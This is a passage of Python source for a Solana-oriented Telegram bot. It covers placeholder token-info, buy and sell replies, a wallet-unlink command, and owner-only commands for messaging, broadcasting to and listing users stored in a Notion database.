    # Handle token information requests
    elif user_state.get("awaiting") == "token_info":
        token_input = text.upper().strip()
        
        # Basic validation - could be symbol or address
        if len(token_input) < 2:
            await update.message.reply_text(
                "❌ Please enter a valid token symbol or address.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_main")]])
            )
            return
        
        # Clear user state
        USER_STATES.pop(user_id, None)
        
        # Placeholder token information response
        token_info_text = f"""🪙 **Token Information: {token_input}**

🔍 **Searching for token data...**

⚠️ **Note:** Full token information features are currently in development.

Available information:
• Token Symbol: {token_input}
• Network: Solana
• Status: Searching...

💡 **Coming Soon:**
• Real-time price data
• Market cap & volume
• Token holder analysis  
• Trading pairs information
• Price charts & analytics

🔄 Try entering another token symbol or return to the main menu."""
        
        back_keyboard = [
            [InlineKeyboardButton("🪙 Search Another Token", callback_data="tokens")],
            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_main")]
        ]
        
        await update.message.reply_text(
            token_info_text,
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(back_keyboard)
        )
    
    # Handle buy token address input
    elif user_state.get("awaiting") == "buy_token_address":
        token_address = text.strip()
        
        # Basic validation for Solana address format
        if len(token_address) < 32 or len(token_address) > 50:
            await update.message.reply_text(
                "❌ Please enter a valid Solana token mint address.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Trade", callback_data="trade")]])
            )
            return
        
        # Clear user state
        USER_STATES.pop(user_id, None)
        
        # Placeholder buy token response
        buy_response_text = f"""💰 **Buy Token**

Token Address: `{token_address}`

🔍 **Fetching token information...**

⚠️ **Note:** Trading functionality is currently in development.

**What would happen next:**
• Token validation and price lookup
• Amount selection interface
• Slippage settings configuration
• Transaction confirmation
• Execution via DEX integration

🚀 **Coming Soon:** Full buy/sell functionality with real-time pricing!"""
        
        buy_response_keyboard = [
            [InlineKeyboardButton("💰 Buy Another Token", callback_data="buy_tokens")],
            [InlineKeyboardButton("🔙 Back to Trade", callback_data="trade")]
        ]
        
        await update.message.reply_text(
            buy_response_text,
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buy_response_keyboard)
        )
    
    # Handle sell token address input
    elif user_state.get("awaiting") == "sell_token_address":
        token_address = text.strip()
        
        # Basic validation for Solana address format
        if len(token_address) < 32 or len(token_address) > 50:
            await update.message.reply_text(
                "❌ Please enter a valid Solana token mint address.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Trade", callback_data="trade")]])
            )
            return
        
        # Clear user state
        USER_STATES.pop(user_id, None)
        
        # Placeholder sell token response
        sell_response_text = f"""💸 **Sell Token**

Token Address: `{token_address}`

🔍 **Checking your holdings...**

⚠️ **Note:** Trading functionality is currently in development.

**What would happen next:**
• Verify token balance in your wallet
• Current market price lookup
• Amount selection (partial or full)
• Slippage settings configuration
• Transaction confirmation
• Execution via DEX integration

🚀 **Coming Soon:** Full buy/sell functionality with portfolio management!"""
        
        sell_response_keyboard = [
            [InlineKeyboardButton("💸 Sell Another Token", callback_data="sell_tokens")],
            [InlineKeyboardButton("🔙 Back to Trade", callback_data="trade")]
        ]
        
        await update.message.reply_text(
            sell_response_text,
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(sell_response_keyboard)
        )

# Unlink wallet
async def unlink_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    success = wallet_db.delete_user_wallet(user_id)
    
    if success:
        await update.message.reply_text("🔓 Wallet unlinked and removed from database.")
    else:
        await update.message.reply_text("No wallet linked.")

async def is_owner(user_id):
    """Check if user is the bot owner"""
    return user_id == OWNER_TELEGRAM_ID

async def send_message_to_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Owner command to send message to specific user"""
    if not await is_owner(update.effective_user.id):
        await update.message.reply_text("Access denied. Owner only command.")
        return
    
    try:
        args = context.args
        if len(args) < 2:
            await update.message.reply_text(
                "Usage: /send_to_user <user_id> <message>\n"
                "Example: /send_to_user 123456789 Hello from the bot owner!"
            )
            return
        
        target_user_id = int(args[0])
        message = " ".join(args[1:])
        
        await context.bot.send_message(
            chat_id=target_user_id,
            text=f"Message from Bot Owner:\n\n{message}",
            parse_mode="Markdown"
        )
        
        await update.message.reply_text(f"Message sent to user {target_user_id}")
        
    except ValueError:
        await update.message.reply_text("Invalid user ID. Must be a number.")
    except Exception as e:
        await update.message.reply_text(f"Failed to send message: {str(e)}")

async def broadcast_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Owner command to broadcast message to all users"""
    if not await is_owner(update.effective_user.id):
        await update.message.reply_text("Access denied. Owner only command.")
        return
    
    try:
        if not context.args:
            await update.message.reply_text(
                "Usage: /broadcast <message>\n"
                "Example: /broadcast Important update: Bot maintenance scheduled"
            )
            return
        
        message = " ".join(context.args)
        
        response = notion.databases.query(database_id=NOTION_DATABASE_ID)
        users = []
        
        for result in response["results"]:
            telegram_id = result["properties"]["telegram_id"]["number"]
            if telegram_id and telegram_id != OWNER_TELEGRAM_ID:
                users.append(telegram_id)
        
        sent_count = 0
        failed_count = 0
        
        for user_id in users:
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"Broadcast Message:\n\n{message}",
                    parse_mode="Markdown"
                )
                sent_count += 1
            except Exception as e:
                logger.error(f"Failed to send broadcast to {user_id}: {e}")
                failed_count += 1
        
        await update.message.reply_text(
            f"Broadcast complete!\n"
            f"Sent to: {sent_count} users\n"
            f"Failed: {failed_count} users"
        )
        
    except Exception as e:
        await update.message.reply_text(f"Broadcast failed: {str(e)}")

async def get_user_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Owner command to get list of all users"""
    if not await is_owner(update.effective_user.id):
        await update.message.reply_text("Access denied. Owner only command.")
        return
    
    try:
        response = notion.databases.query(database_id=NOTION_DATABASE_ID)
        
        user_list = []
        for result in response["results"]:
            telegram_id = result["properties"]["telegram_id"]["number"]
            public_key = result["properties"]["public_key"]["rich_text"][0]["text"]["content"] if result["properties"]["public_key"]["rich_text"] else "No wallet"
            created_at = result["properties"]["created_at"]["date"]["start"] if result["properties"]["created_at"]["date"] else "Unknown"
            
            user_list.append(f"ID: {telegram_id} | Wallet: {public_key[:8]}... | Joined: {created_at[:10]}")
        
        if user_list:
            message = f"Bot Users ({len(user_list)} total):\n\n" + "\n".join(user_list)
            
            if len(message) > 4000:
                chunks = [message[i:i+4000] for i in range(0, len(message), 4000)]
                for chunk in chunks:
                    await update.message.reply_text(chunk)
            else:
                await update.message.reply_text(message)
        else:
            await update.message.reply_text("No users found in database.")
            
    except Exception as e:
        await update.message.reply_text(f"Failed to get user list: {str(e)}")

def main():
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(CommandHandler("unlink_wallet", unlink_wallet))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Owner-only commands
    app.add_handler(CommandHandler("send_to_user", send_message_to_user))
    app.add_handler(CommandHandler("broadcast", broadcast_message))
    app.add_handler(CommandHandler("users", get_user_list))
    
    logger.info("Starting bot...")
    app.run_polling()

if __name__ == "__main__":
    main()
